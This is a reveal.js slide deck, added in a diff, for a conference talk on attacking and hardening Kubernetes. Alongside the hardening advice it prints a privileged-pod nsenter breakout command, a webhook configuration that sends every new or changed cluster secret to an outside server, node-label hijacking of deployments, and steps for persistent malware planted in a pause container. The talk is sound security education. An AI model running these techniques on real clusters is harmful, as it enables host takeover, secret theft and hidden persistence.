@@ -1,0 +1,540 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+	 	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    </script>
+
+		<title>Hack my Talk!</title>
+
+		<link rel="stylesheet" href="http://cdn.troopers.avolens.net:31000/dist/reset.css">
+		<link rel="stylesheet" href="http://cdn.troopers.avolens.net:31000/dist/reveal.css">
+    <link rel="stylesheet" href="http://cdn.troopers.avolens.net:31000/dist/theme/tr22.css">
+
+		<!-- Theme used for syntax highlighted code -->
+		<link rel="stylesheet" href="http://cdn.troopers.avolens.net:31000/plugin/highlight/monokai.css">
+    <header>
+      <div class="header-left"></div>
+      <div class="header-right"></div>
+    </header>
+
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+        <section>
+          <h1>Hack my Talk!</h1>
+          <h3>But it's deployed on Kubernetes</h3>
+        </section>
+
+        <section>
+          <h2>$whoami</h2>
+          <ul>
+            <li>Benjamin Koltermann</li>
+            <li>CEO of AVOLENS</li>
+            <li>Cloud/Kubernetes Security Engineer</li>
+            <li>CTF player @fluxfingers</li>
+            <li>@p4ck3t0 on Twitter</li>
+          </ul>
+        </section>
+
+        <section>
+          <h3>Thanks to Google Cloud for sponsoring the talk environment</h3>
+          <br>
+          <img src="https://www.vectorlogo.zone/logos/google_cloud/google_cloud-ar21.svg" height="100" width="200">
+        </section>
+
+        <section>
+          <h2>Agenda</h2>
+          <br>
+          <ol>
+            <li>Can you eat it? - Introduction</li>
+            <li>A look at the demo environment</li>
+            <li>Let's do some math - 1x1 of Kubernetes security</li>
+            <li>Advanced scenarios</li>
+            <li>Security evaluation</li>
+          </ol>
+        </section>
+
+        <section>
+          <section data-auto-animate>
+            <h2>Can you eat it? - Introduction</h2>
+            <br>
+            <br>
+            <br>
+            <h3>NO!</h3>
+          </section>
+          <section data-auto-animate>
+            <h2>Can you eat it? - Introduction</h2>
+            <ul>
+              <li>Container Orchestrator</li>
+              <li>Master/Worker Nodes</li>
+              <li>Everything is an API-Object</li>
+              <li>Node, Namespace, Deployments, Pods, Services, Ingress</li>
+            </ul>
+          </section>
+          <section data-auto-animate>
+            <h2>Can you eat it? - Introduction</h2>
+            <h4>kube-apiserver</h4>
+            <br>
+            <br>
+            <br>
+            <p>
+            "The API server <b>exposes an HTTP API</b> that lets end users, different parts of your cluster, and external components communicate with one another.
+            The Kubernetes API lets you <b>query and manipulate</b> the state of <b>API objects</b> in Kubernetes (for example: Pods, Namespaces, ConfigMaps, and Events)." - kubernetes.io
+            </p>
+            <br>
+            <br>
+          </section>
+          <section data-auto-animate>
+            <h2>Can you eat it? - Introduction</h2>
+            <h4>etcd</h4>
+            <br>
+            <br>
+            <br>
+            <p>
+            "etcd is a consistent and highly-available key value store used as <b>Kubernetes' backing store for all cluster data</b>." - kubernetes.io
+            </p>
+            <br>
+            <br>
+            <br>
+          </section>
+          <section data-auto-animate>
+            <h2>Can you eat it? - Introduction</h2>
+            <h4>kubelet</h4>
+            <br>
+            <br>
+            <br>
+            <p>
+            "The kubelet is the primary 'node agent' that <b>runs on each node</b>. The kubelet takes a set of PodSpecs that are provided through various mechanisms (primarily through the apiserver) and <b>ensures that the containers</b> described in those PodSpecs are <b>running and healthy</b>." - kubernetes.io
+            </p>
+            <br>
+            <br>
+          </section>
+          <section data-auto-animate>
+            <h2>Can you eat it? - Introduction</h2>
+            <h4>Container runtime</h4>
+            <br>
+            <br>
+            <br>
+            <p>
+            "The container runtime is the software that is <b>responsible for running containers</b>." - kubernetes.io
+            </p>
+            <br>
+            <br>
+            <br>
+          </section>
+        </section>
+
+        <section>
+          <section data-auto-animate>
+            <h2>A look at the demo environment</h2>
+          </section>
+          <section data-auto-animate>
+            <h2>A look at the demo environment</h2>
+            <img src="http://cdn.troopers.avolens.net:31000/img/arch-troopers22.png">
+          </section>
+          <section data-auto-animate>
+            <h2>A look at the demo environment</h2>
+            <br>
+            <h4>Some Assumptions</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>A look at the demo environment</h2>
+            <br>
+            <h4>Some Assumptions</h4>
+            <ol>
+              <li>No attacks on the Kubernetes source code, just on the Kubernetes logic</li>
+              <li>No interaction with 3rd-party products, only vanilla Kubernetes</li>
+              <li>After a successful exploitation of an application, the hacker gains access to different Kubernetes ressources</li>
+            </ol>
+          </section>
+        </section>
+
+        <section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>Malicious Container Image</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>Malicious Container Image</h4>
+            <img src="http://cdn.troopers.avolens.net:31000/img/malicious-image.png" width="45%" style="float: right">
+            <ul style="width: 45%">
+              <li>Untrusted Images</li>
+              <li>Unsafe Pedigree</li>
+            </ul>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>Malicious Container Image</h4>
+            <br>
+            <br>
+            <br>
+            <p>
+              Scan your container images!
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>kube-apiserver</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>kube-apiserver</h4>
+            <img src="http://cdn.troopers.avolens.net:31000/img/rbac.png" width="45%" style="float: right">
+            <ul style="width: 45%">
+              <li>Restrict access to the kube-apiserver
+                <ul>
+                  <li>Role based access(RBAC), default since v1.8</li>
+                  <li>Every pod has the default service account from their namespace</li>
+                </ul>
+              </li>
+              <li>Harden TLS configuration</li>
+              <li>No public exposure</li>
+            </ul>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>kubelet</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>kubelet</h4>
+            <p style="width: 30%; float: right">
+            Kubelets allow <b>unauthenticated</b> access to their HTTPS endpoint, which grants control over the node and containers.
+            </p>
+            <div style="width: 65%">
+              <p>
+                Arguments for the kubelet
+              </p>
+              <pre><code>
+--anonymous-auth=false \
+--authorization-mode=Webhook \
+--kubeconfig=PATH/TO/CONFIG
+              </code></pre>
+              <p>
+                Arguments for the kube-apiserver
+              </p>
+              <pre><code>
+--runtime-config=authorization.k8s.io/v1beta1=true \
+--authorization-mode=RBAC,Node
+              </code></pre>
+            </div>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>Container runtime</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>Container runtime</h4>
+            <pre><code>
+kubectl run breakout -ti \
+--image=alpine \
+--rm \
+--overrides '{"spec":{"hostPID":true,
+"containers":[{"name":"dontlookatme","image":"alpine","stdin":true,"tty":true,
+"securityContext":{"privileged":true},
+"command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"]}]}}'
+            </code></pre>
+          </section>
+          <section data-auto-animate>
+            <h2>Let's do some math - 1x1 of Kubernetes security</h2>
+            <h4>Container runtime</h4>
+            <br>
+            <br>
+            <p>
+              Don't allow privileged pods!
+            </p>
+          </section>
+        </section>
+
+        <section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <br>
+            <br>
+            <p>
+              We can create any kind of resources in a cluster. We aim to read every newly created or updated secret.
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Data Exfiltration</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Data Exfiltration</h4>
+            <br>
+            <br>
+            <h5>Admission controller - ValidatingAdmissionWebhook</h5>
+            <p>
+              Validate every API request of a special ressource and send it to our server.
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Data Exfiltration</h4>
+            <h5>Admission controller - ValidatingAdmissionWebhook</h5>
+            <img src="http://cdn.troopers.avolens.net:31000/img/admission.png">
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Data Exfiltration</h4>
+            <pre>
+              <code data-line-numbers="12-16">
+apiVersion: admissionregistration.k8s.io/v1
+kind: ValidatingWebhookConfiguration
+metadata:
+  name: secret-checker
+webhooks:
+  - name: demo.avolens.net
+    failurePolicy: Ignore
+    timeoutSeconds: 1
+    admissionReviewVersions: ["v1","v1beta1"]
+    sideEffects: None
+    rules:
+      - operations: ["CREATE","UPDATE"]
+        apiGroups: ["*"]
+        apiVersions: ["*"]
+        resources: ["secrets"]
+    clientConfig:
+      url: https://demo.avolens.net/
+              </code>
+            </pre>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Data Exfiltration</h4>
+            <pre>
+              <code data-line-numbers="18">
+apiVersion: admissionregistration.k8s.io/v1
+kind: ValidatingWebhookConfiguration
+metadata:
+  name: secret-checker
+webhooks:
+  - name: demo.avolens.net
+    failurePolicy: Ignore
+    timeoutSeconds: 1
+    admissionReviewVersions: ["v1","v1beta1"]
+    sideEffects: None
+    rules:
+      - operations: ["CREATE","UPDATE"]
+        apiGroups: ["*"]
+        apiVersions: ["*"]
+        resources: ["secrets"]
+    clientConfig:
+      url: https://demo.avolens.net/
+              </code>
+            </pre>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <br>
+            <br>
+            <p>
+              We can connect to one node and get a shell to access our containers (for debugging). We want to influence each deployment that the pods are scheduled on the node we control.
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Stealing Deployments</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Stealing deployments</h4>
+            <br>
+            <br>
+            <h5>Changing node labels</h5>
+            <ol>
+              <li>Check, which labels our node needs.</li>
+              <li>Add the label to our node.</li>
+              <li>If possible remove the label from the other nodes.</li>
+            </ul>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Stealing Deployments</h4>
+            <br>
+            <br>
+            <pre>
+              <code>
+kubectl label nodes NODENAME key=value
+              </code>
+            </pre>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Stealing Deployments</h4>
+            <br>
+            <br>
+            <pre><code data-ln-start-from="20">
+  resources:
+    requests:
+      cpu: 100m
+      memory: 200Mi
+  ports:
+  - containerPort: 80
+nodeSelector:
+  app: slides
+            </code></pre>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Stealing deployments</h4>
+            <br>
+            <h5>Changing node labels</h5>
+            <p>
+            Enable the admission controller NodeRestriction and use the label prefix <b>node-restriction.kubernetes.io/</b> to prevent kubelets from adding/removing/updating such labels.
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <br>
+            <br>
+            <p>
+              We have full access to a node (with root). Let's create our own autoscaling code.
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Autoscaling Malware</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Autoscaling Malware</h4>
+            <br>
+            <br>
+            <h5>Abusing Pause Container</h5>
+            <p>
+              The pause container is a container created in a pod, which holds the network namespace. It is also responsible for reaping zombie processes.
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Autoscaling Malware</h4>
+            <br>
+            <ol>
+              <li>Determine which container runtime is used</li>
+            </ol>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Autoscaling Malware</h4>
+            <br>
+            <ol>
+              <li>Determine which container runtime is used</li>
+              <li>Find out how the sandbox/pause container is used</li>
+            </ol>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Autoscaling Malware</h4>
+            <br>
+            <ol>
+              <li>Determine which container runtime is used</li>
+              <li>Find out how the sandbox/pause container is used</li>
+              <li>Build your own pause container</li>
+            </ol>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Autoscaling Malware</h4>
+            <br>
+            <ol>
+              <li>Determine which container runtime is used</li>
+              <li>Find out how the sandbox/pause container is used</li>
+              <li>Build your own pause container</li>
+              <li>Place the pause image on the node</li>
+            </ol>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Autoscaling Malware</h4>
+            <br>
+            <ol>
+              <li>Determine which container runtime is used</li>
+              <li>Find out how the sandbox/pause container is used</li>
+              <li>Build your own pause container</li>
+              <li>Place the pause image on the node</li>
+              <li>Reload container runtime</li>
+            </ol>
+          </section>
+          <section data-auto-animate>
+            <h2>Advanced scenarios</h2>
+            <h4>Autoscaling Malware - The best things</h4>
+            <br>
+            <ol>
+              <li>A new instance is created when a new pod is created on the node</li>
+              <li>Out of scope for common Kubernetes security tooling (including paid tooling)</li>
+              <li>Kubernetes Cluster behaves normal</li>
+              <li>Persistent over reboot and update</li>
+            </ol>
+          </section>
+        </section>
+
+        <section>
+          <section data-auto-animate>
+            <h2>Security evaluation</h2>
+            <br>
+            <h4>Kubernetes Thread Matrix</h4>
+          </section>
+          <section data-auto-animate>
+            <h2>Security evaluation</h2>
+            <h4>Kubernetes Thread Matrix</h4>
+            <img src="http://cdn.troopers.avolens.net:31000/img/kubernetes-threat-matrix.png" style="margin-left: -50vw;margin-right: -50vw;margin-top: -5vw;max-width: 82vw;position: relative;width: 100vw;">
+          </section>
+        </section>
+
+        <section>
+          <section data-auto-animate>
+            <h2>Hack my talk!</h2>
+            <h4>This talk will be open sourced</h4>
+            <br>
+            <p>
+              https://github.com/avolens/troopers22-hack-my-talk
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Hack my talk!</h2>
+            <h4>This talk is public!</h4>
+            <br>
+            <p>
+              http://slides.troopers.avolens.net:30000/
+            </p>
+          </section>
+          <section data-auto-animate>
+            <h2>Hack my talk!</h2>
+            <br>
+            <br>
+            <h4>Stay safe!</h4>
+          </section>
+        </section>
+
+			</div>
+		</div>
+
+		<script src="http://cdn.troopers.avolens.net:31000/dist/reveal.js"></script>
+		<script src="http://cdn.troopers.avolens.net:31000/plugin/notes/notes.js"></script>
+		<script src="http://cdn.troopers.avolens.net:31000/plugin/markdown/markdown.js"></script>
+		<script src="http://cdn.troopers.avolens.net:31000/plugin/highlight/highlight.js"></script>
+		<script>
+			// More info about initialization & config:
+			// - https://revealjs.com/initialization/
+			// - https://revealjs.com/config/
+			Reveal.initialize({
+				hash: true,
+
+				// Learn about plugins: https://revealjs.com/plugins/
+				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
+			});
+		</script>
+</html>
+
